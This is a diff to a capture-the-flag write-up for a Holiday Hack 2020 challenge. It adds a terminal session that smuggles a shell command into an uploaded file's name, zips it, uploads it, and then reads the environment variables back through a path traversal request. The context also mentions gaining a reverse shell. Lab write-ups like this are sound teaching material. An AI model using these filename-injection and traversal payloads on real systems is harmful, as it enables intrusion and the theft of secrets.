@@ -67,10 +67,21 @@ Get it started:
 curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 ```
 Now you have in the reverse shell listener an interactive shell as user `app`.
+
+```
+jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test2$ touch \'\;env\>joergen\;#\'.jpg 
+jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test2$ zip joergen.zip \'\;env\>joergen\;#\'.jpg 
+  adding: ';env>joergen;#'.jpg (stored 0%)
+jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test2$ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
+["e7807d92-8854-48c2-bd81-d916f5cace1c.jpg"]jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test2$ curl https://tag-generator.kringlecastle.com/image?id=../tmp/joergen
+RUBY_MAJOR=2.7
+
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTM5NTc5NDgyNCwtMTU5OTI1NDQxNSwtNj
-E5Mjk3NDExLC01NzY2MTAwNzUsMjEwNzUyOTg0Niw5MjIxNDQz
-NSwtMzk4NDkxNDYxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5Mz
-MzNjE3ODcsLTE0Njc2MTUyNjIsLTI0Mzk0Mjg2NiwxMzEyMDU2
-NDUzLDkyMDQ1NTg2NSwtMTYwNjA3ODA0MF19
+eyJoaXN0b3J5IjpbMTI5MzcyMDQzOSwxMzk1Nzk0ODI0LC0xNT
+k5MjU0NDE1LC02MTkyOTc0MTEsLTU3NjYxMDA3NSwyMTA3NTI5
+ODQ2LDkyMjE0NDM1LC0zOTg0OTE0NjEsMTE1MTU1Njg5NiwyMz
+g0NjAyNzIsMTkzMzM2MTc4NywtMTQ2NzYxNTI2MiwtMjQzOTQy
+ODY2LDEzMTIwNTY0NTMsOTIwNDU1ODY1LC0xNjA2MDc4MDQwXX
+0=
 -->
